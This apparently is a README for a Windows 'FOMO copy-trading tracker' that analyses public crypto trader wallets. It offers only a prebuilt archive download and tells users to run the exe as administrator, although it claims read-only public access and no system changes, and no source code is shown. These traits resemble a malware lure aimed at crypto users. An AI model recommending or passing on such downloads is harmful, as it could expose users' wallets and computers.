# FOMO Copy-Trading Tracker

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop wallet analyzer for FOMO copy-trading — track performance, PnL, and trading history before you follow a trader.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/epicqueencompact/fomo-copy-trading-tracker-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Desktop wallet analyzer for FOMO copy-trading |
| **Who it's for** | Traders who want data before following a copy-trade leader |
| **What it solves** | Leaderboard noise, short-term luck vs. real skill |
| **How it works** | Pulls public FOMO profile data and on-chain metrics, no account access |

---

## 🔥 Why This Exists

FOMO is one of the fastest-growing crypto apps on Solana. It went from 625,000 users to 2.7 million, and weekly revenue jumped from $139K to $1.39 million in a matter of months. The core feature is copy-trading: follow a trader, and their buys and sells appear in your feed with entry price and live P&L.

The problem is discovery. FOMO's leaderboard ranks traders by PnL over short windows — 24h, 7d, 30d. A trader who took one massive leveraged bet and got lucky will sit at the top of the daily board. A trader who grinds out consistent small wins over months will be buried on page three.

This tracker gives you the data FOMO's leaderboard doesn't show. Consistency, trade count, average hold time, and realized PnL across multiple timeframes. It pulls from public FOMO profiles and on-chain sources — no private keys, no wallet connection, no automation.

---

## 🧩 What It Does

### Wallet Analysis
- Input a FOMO handle or Solana/EVM address
- Fetches public trading history from FOMO profile data
- Calculates win rate, average PnL per trade, and total realized PnL
- Shows average hold time and trade frequency

### Leaderboard Filtering
- Export FOMO top trader leaderboards by window: 24h, 7d, 30d, all-time
- Filter by metrics: consistency score, trade count, risk-adjusted returns
- Sort by what matters to you, not what FOMO's algorithm prioritizes

### Trade History Viewer
- See open and closed positions with entry and exit prices
- Read the trader's own thesis notes when they attached one to a position
- Track per-token performance across the trader's history

### PnL Charts
- Visualize a trader's equity curve over time
- Spot the difference between steady growth and one lucky spike
- Compare multiple traders side by side

### Multi-Chain Support
- Solana and Base (FOMO's supported networks)
- Unified view across both chains for traders who use both

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 200 MB | 500 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Network** | Broadband | Low-latency connection |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `FomoTracker.exe` as administrator
4. **Paste** a FOMO handle or wallet address
5. **Click** Analyze — the tracker fetches public data and builds a profile

---

## ❓ FAQ

**Is my wallet safe?**
Yes — the tracker never accesses your wallet, private keys, or FOMO account. It only reads public profile data and on-chain transactions.

**Do I need a FOMO account?**
No — the tracker works with public data. You don't need to log in or connect anything.

**Does it automate copy-trading?**
No — it's an analyzer, not a bot. It gives you data. You decide what to do with it.

**How accurate is the data?**
The tracker pulls from FOMO's public API and on-chain sources. If a trader's profile is private or incomplete, some metrics may be unavailable.

**Does it work with Pump.fun traders?**
FOMO and Pump.fun are separate platforms. This tracker focuses on FOMO wallets. Pump.fun support may come in a future update.

**How do I uninstall?**
Delete the tracker folder. No registry entries or system changes are made.

---

## 🗺️ Roadmap

- [ ] Pump.fun wallet analysis
- [ ] Telegram alerts for tracked wallets
- [ ] Historical performance export (CSV/JSON)
- [ ] Multi-wallet comparison view
- [ ] Community-shared wallet lists

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/epicqueencompact/fomo-copy-trading-tracker-2026/releases/tag/1.0.0)

**Version 1.0.0** — Stable Release · Wallet Analyzer · Copy-Trading Research · MIT

</div>
